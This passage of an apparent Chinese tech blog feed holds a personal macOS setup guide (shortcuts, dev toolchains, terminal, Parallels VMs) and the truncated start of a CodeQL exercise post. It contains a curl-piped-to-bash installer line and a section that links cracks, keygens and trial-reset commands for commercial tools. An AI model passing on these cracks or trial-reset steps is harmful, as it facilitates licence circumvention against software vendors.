    <content type="html"><![CDATA[<p>最近入手了一台苹果电脑（也有两个月了），成年人的第一台苹果电脑，Macbook Pro，M2芯片，Ventura 13.3。</p><p>Mac电脑的很多操作跟Windows电脑的不一样，导致经常按错 Ctrl 和 Command 或 Shift 和 中英文切换键，又比如用Windows电脑时习惯性刷新桌面，Mac没有这操作（或者说没必要），也没有右键新建文件等等。所以有必要好好学学，习惯下，提高效率。</p><p>Mac电脑也有一些缺点：没多少游戏，一些安全工具只支持win系统，部分软件不支持M2芯片。</p><p>但是用起来是真的流畅。</p><p>本文记录下我的个人常用操作，配置，和常用软件下载安装。</p><h1 id="主桌面介绍"><a href="#主桌面介绍" class="headerlink" title="主桌面介绍"></a>主桌面介绍</h1><p>顶部菜单栏：</p><ul><li>去掉Siri：系统设置 - 控制中心 - Siri - 不在菜单栏中显示</li><li>调整菜单栏APP顺序：Command + 鼠标拖动</li></ul><p>右侧通知中心：两指从触控板最右向左滑 或 点击顶部菜单栏右侧的时间。（我就设置为显示个天气和日历）</p><p>控制中心：在顶部菜单栏右侧的一个按钮</p><p>底部程序坞：对于不常用的软件可以右键 - 选项 - 从程序坞中移除</p><p>调度中心：三指上滑打开</p><p>左侧台前调度：可在控制中心里打开。打开了这个，就不能同时显示多个不同应用的窗口了，但可以使用分屏。</p><p>启动台：拇指和另外三根手指合拢</p><p>触发角：屏幕的四个角，系统设置 - 桌面与程序坞 - 触发角。 可设置一两个常用的，如显示桌面</p><h1 id="设置"><a href="#设置" class="headerlink" title="设置"></a>设置</h1><ul><li>将光标移动速度调快（默认的设置移动得慢，在终端下移动尤为明显）：设置 - 键盘， 将“键重复速率”调到快，将“重复前延迟”调到短。前者对应移动速度，后者移动前的反应时间。</li><li>修改电脑名称：系统设置 - 通用 - 关于本机，直接在名称一栏打字修改； 修改本地主机名：系统设置 - 通用 - 共享，修改本地主机名</li><li>访达里显示所有文件的扩展名：设置 - 高级 - 显示所有文件扩展名</li></ul><h1 id="操作与快捷键"><a href="#操作与快捷键" class="headerlink" title="操作与快捷键"></a>操作与快捷键</h1><p>按F1键：按住Fn再点击键盘上的触控栏（有的Mac电脑没触控栏，这种情况估计是按Fn键跟F1吧）</p><p>尽量避免单击触控板：</p><ul><li>用其他操作来代替单击：三指向上滑动和向下滑动来切换应用（不用单击触控板）</li><li>可以设置：系统设置 - 触控板 - 触控板 - 轻点来点按， 这样就不用物理按下触控板（但可能会误触）</li></ul><p>Safari：</p><ul><li>切换标签页：Control + Tab 或 Control + Shift + Tab。 通过快捷键来切换，感觉也不是很方便</li><li>在新标签页中打开网页：按住 Command 键再点链接</li></ul><p>自带终端：</p><ul><li>将光标移动到行首（Control + A）或行尾（Control + E）</li><li>向左或向右移动一个单词：Option + 方向键</li><li>删除一个单词：Control + W</li><li>删除整行：Control + U（这是zsh的快捷键，在bash下，这个快捷键是删除光标到行首的字符）</li><li>删除光标到行首的字符：Meta + W （终端 - 设置 - 描述文件 - 键盘 - 将Option作为Meta键）</li></ul><p>访达：</p><ul><li>长按 Option 键：显示当前路径</li><li>Command + Option + C：复制当前路径</li><li>Command + 退格键：删除文件</li><li>可右键新建目录，不可新建文件。要新建文件可用其他软件，如VSCode等，或 touch 命令</li><li>复制粘贴文件：C<em>ommand</em> + <em>C ，</em> C<em>ommand</em> + V。 剪切粘贴文件：C<em>ommand</em> + <em>C ，</em> C<em>ommand</em> + Option + V</li></ul><p>归档实用工具：</p><ul><li>macOS自带的归档实用工具可以zip压缩和解压</li><li>不支持rar格式压缩包</li><li>不支持加密压缩</li><li>可以安装 bandizip 或其他压缩软件</li><li>对于rar格式压缩，可安装rar命令： <code>brew install rar</code></li></ul><p>其他快捷键：</p><ul><li>与Windows系统不同的是，Mac下有单独的中英文切换键，而不是用Shift切换中英文</li><li>Command + 空格键：显示聚焦搜索</li><li>Command + W：关闭窗口</li><li>Command + Q：关闭程序</li><li>Option + Command + D：显示/隐藏底部程序坞</li><li>Control  + Command + Q：立即锁定屏幕</li><li>长按 Command + 空格键：启动Siri （估计快捷键冲突了，在我电脑上按这个没反应）</li><li>Fn + F：全屏</li><li>Fn + 退格键：删除右侧字符</li><li>Command + 方向键：移到行首或行尾</li></ul><p>（记不住那么多快捷键，容易搞混，选一些常用的记住，其余的用其他操作代替）</p><h1 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h1><ul><li>Mach-O（Mach Object File Format）格式文件：可执行文件和动态库都是这个格式的文件。由dyld程序加载</li><li>.dylib后缀为动态库文件，.a后缀为静态库文件。 执行 <code>otool -l /usr/sbin/tcpdump</code> ， 查看Mach -0 文件的加载命令信息，可以看到tcpdump会加载<code>/usr/lib/libpcap.A.dylib</code> ，但实际上并没有这个文件。原因：<a href="https://developer.apple.com/documentation/macos-release-notes/macos-big-sur-11_0_1-release-notes">https://developer.apple.com/documentation/macos-release-notes/macos-big-sur-11_0_1-release-notes</a> 的 62986286 部分，可知苹果系统将所有系统提供的库放到了动态链接缓存</li><li>icns文件：图标文件。读写该文件的工具：<a href="https://github.com/relikd/icnsutil">https://github.com/relikd/icnsutil</a></li><li>dmg文件：文件查看：7z软件、hidutil。双击打开dmg文件，系统将会将其挂载为一个虚拟磁盘（挂载在 /Volumes 目录下），并在 Finder 中“位置”一栏里显示（默认也会在桌面显示，可在访达-设置-通用-取消勾选外置磁盘 来关闭显示）。运行完后直接推出即可。若在Finder里的位置对磁盘映像右键 - 不在Finder显示后，可以在磁盘工具里还能看到，可在这推出磁盘。</li><li>.DS_Store文件：Desktop Services Store（桌面服务存储），用来存储这个文件夹的显示属性的：比如文件图标的摆放位置。</li><li>.app目录：软件包，双击运行。</li></ul><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><ul><li>/Applications： 应用程序目录。该目录存放了系统与用户安装的应用程序，启动台（Launchpad）里可以看到所有安装的程序。</li><li>/Library： 存放系统应用的数据及文档信息。</li><li>/Network： 网络邻居虚拟目录。</li><li>/System/Library： 存放了系统运行的重要组件，如框架与内核模块。一些系统内置的第三方程序也在该目录下，如Perl</li><li>/Users: 所有用户的主目录都位于此目录下</li><li>/Volumes: 可移动媒体、磁盘、dmg镜像的挂载点。</li><li>~/Library/Preferences/<appid>/：存储应用程序的plist文件</li><li>~/Library/Containers/：每个开启了沙盒的软件都会在此目录下生成一个以程序标识符命名的子目录，此目录下会将一些系统特定的目录以软链接的形式创建在此目录中的Data目录下。</li><li>~/Library/Application Support/Core Data：另一种软件保存数据的地方，它本质上是对Sqlite数据库访问的一层外包装</li></ul><h1 id="软件"><a href="#软件" class="headerlink" title="软件"></a>软件</h1><h3 id="ClashX"><a href="#ClashX" class="headerlink" title="ClashX"></a>ClashX</h3><p><a href="https://clashx.org/clashx-download/">https://clashx.org/clashx-download/</a></p><ul><li><p>配置 - 托管配置 - 管理： 添加订阅地址</p></li><li><p>配置 - 托管配置，取消勾选自动更新：基于安全考虑，且不需要及时更新机场的节点变动、剩余流量和到期时间，可以取消掉</p></li><li><p>设置为系统代理的原理是，修改了系统设置。也可自己手动设置系统代理，在 系统设置 - 网络，选择一个网络设置代理</p></li><li><p>控制台 - 设置 - 代理模式：有三种：全局、规则、直连</p></li><li><p>控制台 - 代理 - 策略组：策略组（proxy-groups）有：延迟最低、故障转移、手动选择、负载均衡 四种模式：</p><ul><li>自动选择（url-test），每隔一段时间进行延迟测试，选择延迟最低的节点。</li><li>故障转移（fallback），每次都选组内第一个节点，无法使用再换到第二个，依次类推。</li><li>手动选择（select），手动选节点。</li><li>负载均衡（load-balance），每个节点都用用，由于很多机场都有连接数的限制，因此实际使用较少。</li></ul><p>当代理模式为“规则”时，根据规则匹配使用指定的策略组</p></li></ul><h3 id="golang多版本"><a href="#golang多版本" class="headerlink" title="golang多版本"></a>golang多版本</h3><p><a href="https://github.com/voidint/g">https://github.com/voidint/g</a></p><ol><li><p>下载<a href="https://github.com/voidint/g/releases">release</a>的二进制压缩包</p></li><li><p>将压缩包解压至<code>PATH</code>环境变量目录下（推荐<code>~/.g/bin</code>目录），将<code>~/.g/bin/g</code>重命名为<code>~/.g/bin/gvm</code>，（因为<code>g</code>太短容易冲突）</p></li><li><p>将所需的环境变量写入<code>~/.g/env</code>文件</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/sh</span><br><span class="hljs-comment"># g shell setup</span><br><span class="hljs-built_in">export</span> GOROOT=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;HOME&#125;</span>/.g/go&quot;</span><br><span class="hljs-built_in">export</span> PATH=<span class="hljs-string">&quot;<span class="hljs-variable">$&#123;HOME&#125;</span>/.g/bin:<span class="hljs-variable">$&#123;GOROOT&#125;</span>/bin:<span class="hljs-variable">$PATH</span>&quot;</span><br><span class="hljs-built_in">export</span> G_MIRROR=https://golang.google.cn/dl/<br></code></pre></div></td></tr></table></figure></li><li><p>将<code>~/.g/env</code>导入到shell环境配置文件：<code>vim ~/.bashrc</code>：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># g shell setup</span><br><span class="hljs-keyword">if</span> [ -f <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;HOME&#125;</span>/.g/env&quot;</span> ]; <span class="hljs-keyword">then</span><br>    . <span class="hljs-string">&quot;<span class="hljs-variable">$&#123;HOME&#125;</span>/.g/env&quot;</span><br><span class="hljs-keyword">fi</span><br></code></pre></div></td></tr></table></figure></li><li><p>启用环境变量：<code>source ~/.bashrc</code></p></li><li><p>安装指定版本的golang：<code>gvm install 1.20.4</code></p></li></ol><h3 id="多Java版本管理"><a href="#多Java版本管理" class="headerlink" title="多Java版本管理"></a>多Java版本管理</h3><ol><li>在 <a href="https://www.oracle.com/java/technologies/downloads/archive/">https://www.oracle.com/java/technologies/downloads/archive/</a> 下载  Java SE 8 (8u202 and earlier) 和 Java SE 20 。 下载Java SE Development Kit 的 MacOS dmg包（M2芯片选AARCH64架构），双击启动，安装。</li><li>vim ~/.bashrc：</li></ol><figure class="highlight jsx"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jsx"># <span class="hljs-title class_">Java</span> config<br><span class="hljs-keyword">export</span> <span class="hljs-variable constant_">JAVA_8_HOME</span>=<span class="hljs-string">&quot;/Library/Java/JavaVirtualMachines/jdk1.8.0_202.jdk/Contents/Home&quot;</span><br><span class="hljs-keyword">export</span> <span class="hljs-variable constant_">JAVA_20_HOME</span>=<span class="hljs-string">&quot;/Library/Java/JavaVirtualMachines/jdk-20.jdk/Contents/Home&quot;</span><br><br># config <span class="hljs-title class_">Java</span> alias<br>alias jdk8=<span class="hljs-string">&quot;export JAVA_HOME=$JAVA_8_HOME&quot;</span><br>alias jdk20=<span class="hljs-string">&quot;export JAVA_HOME=$JAVA_20_HOME&quot;</span><br><br># config <span class="hljs-keyword">default</span> jdk<br><span class="hljs-keyword">export</span> <span class="hljs-variable constant_">JAVA_HOME</span>=$JAVA_8_HOME<br><span class="hljs-keyword">export</span> <span class="hljs-variable constant_">PATH</span>=<span class="hljs-string">&quot;$JAVA_HOME:$PATH&quot;</span><br></code></pre></div></td></tr></table></figure><ol><li>在 <code>~/.zshrc</code> 里加上  <code>source ~/.bashrc</code> 这句</li></ol><h3 id="多npm版本管理"><a href="#多npm版本管理" class="headerlink" title="多npm版本管理"></a>多npm版本管理</h3><p>安装nvm：<a href="https://github.com/nvm-sh/nvm">https://github.com/nvm-sh/nvm</a></p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">curl -o- &lt;https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.3/install.sh&gt; | bash<br><br><span class="hljs-comment"># vim ~/.bashrc ，加上：</span><br><br><span class="hljs-built_in">export</span> NVM_DIR=<span class="hljs-string">&quot;<span class="hljs-variable">$HOME</span>/.nvm&quot;</span><br>[ -s <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/nvm.sh&quot;</span> ] &amp;&amp; \\. <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/nvm.sh&quot;</span>  <span class="hljs-comment"># This loads nvm</span><br>[ -s <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/bash_completion&quot;</span> ] &amp;&amp; \\. <span class="hljs-string">&quot;<span class="hljs-variable">$NVM_DIR</span>/bash_completion&quot;</span>  <span class="hljs-comment"># This loads nvm bash_completion</span><br><br><span class="hljs-comment"># 安装nodejs、npm</span><br>nvm install node<br><br><span class="hljs-comment"># 安装hexo</span><br>npm install hexo-cli -g<br>npm install hexo-deployer-git --save<br></code></pre></div></td></tr></table></figure><h3 id="Tabby终端"><a href="#Tabby终端" class="headerlink" title="Tabby终端"></a>Tabby终端</h3><p>Tabby终端：<a href="https://github.com/Eugeny/tabby，">https://github.com/Eugeny/tabby，</a> 基于nodejs electron编写的，占内存多。之所以选这个终端软件，是因为当时看它Github介绍那图片，以为不用设置一堆就那么好看了，结果还是要装oh-my-zsh，配置一堆。</p><p>一些设置：</p><ul><li>Preference - 应用 - Tabby集成。 Finder 右键一个目录 - 快速操作 - 自定义， 将Tabby勾选上</li><li>Preference - 配色方案，选一个背景颜色看起来可以的就行</li><li>该终端下Command + 左/右方向键，光标移动到行首或行尾（该快捷键在其他应用下的也是一样的效果）</li><li>删除光标到行首的字符：默认按Control + U是删除整行，无论光标在哪个位置。 点 Tabby - Preferences - 快捷键 - 删除整行，将该快捷键设置为Control + U即可</li></ul><p>zsh：MacOS默认使用zsh</p><ul><li>兼容Bash</li><li>命令选项补全：如输入<code>git</code> 再按TAB键</li><li>等等特性</li></ul><p>oh-my-zsh安装：<a href="https://ohmyz.sh/#install">https://ohmyz.sh/#install</a> （运行它的安装脚本会被覆盖掉 <code>~/.zshrc</code> ，所以需事先备份下这个文件）</p><ul><li>禁用自动更新：修改<code>~/.zshrc</code>，取消注释 <code>zstyle &#39;:omz:update&#39; mode disabled</code></li><li>关掉 URL 反斜杠转义：修改<code>~/.zshrc</code>，取消注释 <code>DISABLE_MAGIC_FUNCTIONS=true</code> ， （就是在粘贴URL地址时一些特殊符号前面会加上反斜杠的问题）</li><li>安装p10k主题，参考：<a href="https://github.com/romkatv/powerlevel10k#oh-my-zsh，">https://github.com/romkatv/powerlevel10k#oh-my-zsh，</a> 新建一个终端或者执行<code>p10k configure</code>配置，按提示进行配置（在选择编码时，选择Unicode，主题会好看些）。</li><li>若p10k的prompt的unicode图标显示不出，但在上一步的<code>p10k configure</code>过程中明明是可以显示的。 则配置下字体： Tabby - Preferences - 外观 - 字体：选择Hack Nerd Font Mono。</li><li>若macOS自带的终端应用里，p10k的unicode图标显示不出，则 终端 - 设置 - 描述文件，更改字体为 Hack Nerd font Mono。</li><li>附：安装hack-nerd字体，参考：<a href="https://github.com/ryanoasis/nerd-fonts#option-4-homebrew-fonts。">https://github.com/ryanoasis/nerd-fonts#option-4-homebrew-fonts。</a> （似乎MacOS默认已有该字体了，可打开“字体库app”确认下）</li></ul><h3 id="Parallels-Desktop"><a href="#Parallels-Desktop" class="headerlink" title="Parallels Desktop"></a>Parallels Desktop</h3><p>版本：<code>https://download.parallels.com/desktop/v18/18.1.1-53328/ParallelsDesktop-18.1.1-53328.dmg</code></p><p>操作：</p><ul><li>打开多个虚拟机：窗口 - 控制中心</li><li>取消自动更新：偏好设置 - 通用 - 检查更新， 从不</li><li>有bug，容易卡住，也不知道怎么回事，如果遇到就重启虚拟机</li></ul><p>镜像下载：</p><ul><li><p>Kali Linux：渗透使用。下载iso镜像，Apple Silicon (ARM64)版： <a href="https://www.kali.org/get-kali/#kali-installer-images。Kali">https://www.kali.org/get-kali/#kali-installer-images。Kali</a> 2023.1 ARM64</p><ul><li>添加虚拟机过程中，取消勾选“在Mac桌面上创建别名”，勾选“安装前设定”，可设置下内存之类的</li><li>kali虚拟机安装过程中：位置选中国（这样系统字体才不是繁体字）</li><li>kali虚拟机安装后：安装 Parallels Tools</li></ul><p>上面这种下载Kali 2023.1 ARM64镜像再自己安装的方式，虚拟机内会出现鼠标失灵、键盘失灵，或键盘按一个字符就输了三次该字符的问题。所以还是直接用Paralles Desktop提供的kali 2022.2镜像。</p><ul><li>执行完 <code>sudo apt update</code> 和 <code>sudo apt upgrade</code> ， 打个快照</li><li>安装中文输入法：<code>apt-get install fcitx fcitx-googlepinyin</code>。点击右上角键盘按钮 - Configure - Input Method，添加一项Google Pinyin，并将其排到最顶。再点击 Global Config 栏，设置 Trigger Input Method 的快捷键为 LShift 和 RShift ，这样就可以用Shift键切换中英文了。</li><li>取消共享：默认会将宿主机Mac的一些文件共享给Linux虚拟机。操作 - 配置 - 选项 - 共享 - 共享Mac，取消勾选“与Linux共享自定义Mac文件”等。</li></ul></li><li><p>Windows 11：逆向、渗透使用。</p><ul><li>取消共享：默认会将宿主机Mac的一些文件共享给Win虚拟机，Win虚拟机的文件也可以被宿主机访问（后者我就不取消了）。 操作 - 配置 - 选项 - 共享 - 共享Mac，取消勾选“镜像Mac和Windows用户文件夹”（共享Mac：宿主机Mac的一些文件可被Win虚拟机访问；共享Windows：Win虚拟机下的文件可被宿主机Mac访问。）</li><li>文件传输：可以直接拖动文件或Command + C 、 Command + V</li></ul></li><li><p>MacOS 13：</p><ul><li>Parallels Desktop对MacOS 虚拟机没有设置按钮，要设置内存、网络等需在MacOS虚拟机里用命令去设置，参考：<a href="https://kb.parallels.com/128842">https://kb.parallels.com/128842</a></li><li>开启文件共享，参考： <a href="https://sspai.com/post/61388。">https://sspai.com/post/61388。</a> 在宿主机连接共享文件时总连不上（点连接按钮时窗口抖动了几下），通过重启虚拟机解决。</li><li>MacOS 下的 Parallels Tools ，目前仅支持 共享粘贴板 的功能</li><li>关闭Mac虚拟机的SIP机制：在 Parallels Desktop 控制台，右键MacOS - 以恢复模式启动，点击菜单栏打开终端，再执行 <code>csrutil disable</code> 或 <code>csrutil enable --without dtrace</code> （只关闭SIP对dtrace的限制），重启虚拟机</li></ul></li></ul><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>还有其它一些免费的软件：</p><ul><li>Homebrew</li><li>XCode</li><li>VSCode</li><li>Chrome</li><li>Notion笔记（<a href="https://www.notion.so/desktop）">https://www.notion.so/desktop）</a></li></ul><p>一些软件可以通过重置试用期来达到无限使用，如：</p><ul><li>Navicat Premium（<a href="https://www.navicat.com/en/download/navicat-premium）：[https://gitee.com/ProgHub/unlimited_trial_navicat_premium/blob/master/Mac/reset_navicat.sh]">https://www.navicat.com/en/download/navicat-premium）：[https://gitee.com/ProgHub/unlimited_trial_navicat_premium/blob/master/Mac/reset_navicat.sh]</a>(<a href="https://gitee.com/ProgHub/unlimited_trial_navicat_premium/blob/master/Mac/">https://gitee.com/ProgHub/unlimited_trial_navicat_premium/blob/master/Mac/</a> reset_navicat_by_52pojie.sh)</li><li>Beyond Compare（<a href="https://www.scootersoftware.com/download）：`rm">https://www.scootersoftware.com/download）：`rm</a> ~/Library/Application\ Support/Beyond\ Compare/registry.dat`</li><li>010 Editor（<a href="https://www.sweetscape.com/download/010editor/">https://www.sweetscape.com/download/010editor/</a> ）：<code>rm ~/.config/SweetScape/010\\ Editor.ini</code></li></ul><p>有的试用期到了还能用，不知道怎么回事。像：</p><ul><li>PasteNow（<a href="https://pastenow.app/）：这是个粘贴板历史软件">https://pastenow.app/）：这是个粘贴板历史软件</a></li></ul><p>有的网上有公开如何破解：</p><ul><li>Typora（<a href="https://typora.io/releases/all）：https://bbs.kanxue.com/thread-273420.htm">https://typora.io/releases/all）：https://bbs.kanxue.com/thread-273420.htm</a></li><li>Parallels Desktop：<a href="https://git.icrack.day/somebasj/ParallelsDesktopCrack">https://git.icrack.day/somebasj/ParallelsDesktopCrack</a></li><li>Burpsuite Pro：<a href="https://github.com/h3110w0r1d-y/BurpLoaderKeygen">https://github.com/h3110w0r1d-y/BurpLoaderKeygen</a></li></ul><p>有的网上找个注册码就行了：</p><ul><li>Proxifier for Mac v3（<a href="https://www.proxifier.com/download/）。">https://www.proxifier.com/download/）。</a></li></ul><p>或者tb买激活码：</p><ul><li>JetBrain的IDE，GoLand、PyCharm、IDEA等</li></ul><p>有条件的话就支持正版吧。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近入手了一台苹果电脑（也有两个月了），成年人的第一台苹果电脑，Macbook Pro，M2芯片，Ventura 13.3。&lt;/p&gt;
&lt;p&gt;Mac电脑的很多操作跟Windows电脑的不一样，导致经常按错 Ctrl 和 Command 或 Shift 和 中英文切换键，又比如</summary>
      
    
    
    
    
    <category term="MacOS" scheme="https://ovi3.github.io/tags/MacOS/"/>
    
  </entry>
  
  <entry>
    <title>CodeQL官方教程中几道QL练习题</title>
    <link href="https://ovi3.github.io/2021/03/04/codeql-exercises-from-ql-tutorial/"/>
    <id>https://ovi3.github.io/2021/03/04/codeql-exercises-from-ql-tutorial/</id>
    <published>2021-03-04T07:29:19.000Z</published>
    <updated>2024-07-21T05:46:47.651Z</updated>
    
    <content type="html"><![CDATA[<p>跟着CodeQL官方的<a href="https://codeql.github.com/docs/writing-codeql-queries/ql-tutorials/#ql-tutorials">QL tutorials</a>做练习，在<a href="https://codeql.github.com/docs/writing-codeql-queries/crown-the-rightful-heir/">Crown the rightful heir</a>这一章节中有五个问题，来做一做。在看这篇文章之前需先跟着官方的QL tutorial做一遍。</p><p>下面的CodeQL代码，直接放到<a href="https://lgtm.com/query/6710025057257064639/">这里</a>运行即可</p><h4 id="What-is-the-most-common-hair-color-in-the-village-And-in-each-region"><a href="#What-is-the-most-common-hair-color-in-the-village-And-in-each-region" class="headerlink" title="What is the most common hair color in the village? And in each region?"></a>What is the most common hair color in the village? And in each region?</h4><p>第一个问题：村里发色最多的一种是哪种颜色</p><figure class="highlight scala"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scala"><span class="hljs-keyword">import</span> tutorial<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HairColor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">string</span></span>&#123;<br>  <span class="hljs-type">HairColor</span>()&#123;<br>    exists(<span class="hljs-type">Person</span> p | <span class="hljs-keyword">this</span> = p.getHairColor())<br>  &#125;<br>  <br>  int ct()&#123;<br>    result = count(<span class="hljs-type">Person</span> p | p.getHairColor() = <span class="hljs-keyword">this</span> | p)<br>  &#125;<br>  <br>&#125;<br><br><br>from <span class="hljs-type">HairColor</span> c<br>where not exists(<span class="hljs-type">HairColor</span> c1 | c1.ct() &gt; c.ct())<br>select c, c.ct()<br></code></pre></div></td></tr></table></figure><p>执行结果：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">brown</span><span class="hljs-number">46</span><br></code></pre></div></td></tr></table></figure><p>第二个问题：每个地区发色最多的一种是哪种颜色</p><figure class="highlight scala"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs scala"><span class="hljs-keyword">import</span> tutorial<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">HairColor</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">string</span></span>&#123;<br>  <span class="hljs-type">HairColor</span>()&#123;<br>    exists(<span class="hljs-type">Person</span> p | <span class="hljs-keyword">this</span> = p.getHairColor())<br>  &#125;<br>  <br>  <span class="hljs-comment">// int ct()&#123;</span><br>  <span class="hljs-comment">//   result = count(Person p | p.getHairColor() = this | p)</span><br>  <span class="hljs-comment">// &#125;</span><br>  <br>  int ctOfLocation(<span class="hljs-type">Location</span> loc)&#123; <br>    result = count(<span class="hljs-type">Person</span> p | p.getLocation() = loc and p.getHairColor() = <span class="hljs-keyword">this</span> | p)<br>  &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Location</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">string</span></span>&#123;<br>  <span class="hljs-type">Location</span>() &#123;<br>    <span class="hljs-keyword">this</span> in [<span class="hljs-string">&quot;east&quot;</span>, <span class="hljs-string">&quot;west&quot;</span>, <span class="hljs-string">&quot;south&quot;</span>, <span class="hljs-string">&quot;north&quot;</span>]<br>  &#125;<br>&#125;<br><br>from <span class="hljs-type">Location</span> location, <span class="hljs-type">HairColor</span> c<br>where c.ctOfLocation(location) = max(<span class="hljs-type">HairColor</span> c1 | | c1.ctOfLocation(location) )<br>select location, c, c.ctOfLocation(location)<br><br><br></code></pre></div></td></tr></table></figure><p>执行结果：</p><figure class="highlight mipsasm"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs mipsasm">west<span class="hljs-keyword">brown</span><span class="hljs-number">7</span><br>east<span class="hljs-keyword">brown</span><span class="hljs-number">11</span><br><span class="hljs-keyword">north</span><span class="hljs-keyword">black</span><span class="hljs-number">8</span><br>south<span class="hljs-keyword">brown</span><span class="hljs-number">10</span><br></code></pre></div></td></tr></table></figure><p>说明下：各地区拥有brown发色的人的个数分别是：</p><ul><li>西部：7</li><li>东部：11</li><li>北部：3</li><li>南部：10</li><li>无地区：15 （也就是<code>Person.getLocation()</code>为空的人）</li></ul><p>总数就是46，符合第一个问题的查询结果。</p><h4 id="Which-villager-has-the-most-children-Who-has-the-most-descendants"><a href="#Which-villager-has-the-most-children-Who-has-the-most-descendants" class="headerlink" title="Which villager has the most children? Who has the most descendants?"></a>Which villager has the most children? Who has the most descendants?</h4><p>第一个问题：哪位村民拥有最多小孩</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs reasonml">import tutorial<br><br>Person child<span class="hljs-constructor">Of(Person <span class="hljs-params">p</span>)</span> &#123;<br>  p = parent<span class="hljs-constructor">Of(<span class="hljs-params">result</span>)</span><br>&#125;<br><br><span class="hljs-built_in">int</span> children<span class="hljs-constructor">Number(Person <span class="hljs-params">p</span>)</span> &#123;<br>  result = count(Person c <span class="hljs-pattern-match">| c = child<span class="hljs-constructor">Of(<span class="hljs-params">p</span>)</span> | c)</span><br><span class="hljs-pattern-match">&#125;</span><br><span class="hljs-pattern-match"></span><br><span class="hljs-pattern-match">from <span class="hljs-constructor">Person</span> p</span><br><span class="hljs-pattern-match">where children<span class="hljs-constructor">Number(<span class="hljs-params">p</span>)</span> = max(<span class="hljs-constructor">Person</span> q | | children<span class="hljs-constructor">Number(<span class="hljs-params">q</span>)</span>)</span><br><span class="hljs-pattern-match">select p, children<span class="hljs-constructor">Number(<span class="hljs-params">p</span>)</span></span><br></code></pre></div></td></tr></table></figure><p>第二个问题：哪位村民拥有最多后代</p><figure class="highlight reasonml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 